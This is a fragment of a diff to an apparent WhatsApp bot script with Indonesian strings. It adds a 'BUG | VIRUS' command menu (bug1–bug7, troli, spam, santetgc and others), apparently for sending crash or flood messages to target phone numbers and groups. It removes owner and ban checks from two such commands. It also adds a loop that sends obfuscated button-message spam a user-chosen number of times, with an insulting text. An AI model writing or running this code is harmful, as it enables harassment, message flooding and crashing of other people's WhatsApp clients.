+"retailerId": ` WE ARE NOT MASTOD`,
 "url": "wa.me/6285714170944"
 },
 "businessOwnerJid": "6285714170944@s.whatsapp.net",
@@ -4999,8 +5381,6 @@ m.reply(tekteka)
 break
 //=================================================//
 case 'jagoanom' : {
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hello.`
@@ -5075,11 +5455,9 @@ break
 
 //=================================================//
 case '🌷':{
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku XeonBotInc`
+ydd = `YOU ARE AN IDIOT`
 for (let i = 0; i < jumlah; i++) {
 function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','6281214281312','771192XPifQJ','6285714170944','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await XeonBotInc[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'Done','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'Done','id':_0x47bf3a(0x153)}}]}));
  await sleep(20)
@@ -9305,7 +9683,7 @@ return reply (`┌─────❖
 ┌───────────────❖ 
 │Thanks to
 │Allah SWT
-│Xeon
+│DGXeon
 │Kevin
 │Tioo
 │Dikaa
@@ -9503,7 +9881,8 @@ return reply(`╔═══════✪「 OWNER 」
 ╠ ${prefix}unblock [tag/number]
 ╠ ${prefix}coowner [add/del]
 ╠ ${prefix}changelog
-╠═══════✪「 GROUP 」	        
+╠═══════✪「 GROUP 」
+╠${prefix}searchgc	        
 ╠${prefix}grousetting
 ╠${prefix}grouplink
 ╠${prefix}ephemeral [option]
@@ -9540,16 +9919,35 @@ return reply(`╔═══════✪「 OWNER 」
 ╠${prefix}checkvote
 ╠${prefix}delvote
 ╠═════════✪「 BUG | VIRUS 」	
+╠${prefix}bugtiktok [ Link ] - Bug Sw
+╠${prefix}buginvite [ jumlah ] Pc
+╠${prefix}buglokas [ jumlah ]
+╠${prefix}bugstik [ jumlah ]
+╠${prefix}buttonampas [ jumlah ]
+╠${prefix}troli [ jumlah ]
+╠${prefix}troli2 [ jumlah ]
+╠${prefix}spam [ Reply Pesan ]
+╠${prefix}bugtag [ jumlah ]
+╠${prefix}bug1 [ jumlah ]
+╠${prefix}bug2 [ jumlah ]
+╠${prefix}bug3 [ jumlah ]
+╠${prefix}bug4 [ jumlah ]
+╠${prefix}bug5 [ jumlah ]
+╠${prefix}bug6 [ jumlah ]
+╠${prefix}bug7 [ jumlah ]
+╠${prefix}poll [ jumlah ]
 ╠${prefix}jagoanom [ reply target ]
 ╠${prefix}cataloggc 1237891xxxx@g.us|10|10s
 ╠${prefix}🔥 628xxx|5|5
 ╠${prefix}🌷 628xxx|5|5
+╠${prefix}inibug [ jumlah ]
 ╠${prefix}ampas1 628xxx
 ╠${prefix}ampas2 628xxx
 ╠${prefix}santetgc 628xxx@s.whatsapp.net|10|10s
 ╠${prefix}santetdia 628xxx@s.whatsapp.net|10|10s
 ╠${prefix}catalogpc 628xxx@s.whatsapp.net|10|10s
 ╠${prefix}jadibug1 [ Reply Video To Bug Audio ]
+╠${prefix}jadikatalog [ reply sticker ] jumlah
 ╠${prefix}jadibug2 [ Reply Video To Bug Mp3 ]
 ╠${prefix}jadibug3 [ Reply Audio To Bug Vn ]
 ╠${prefix}jadibug4 [ Reply Sticker To Bug Image ]
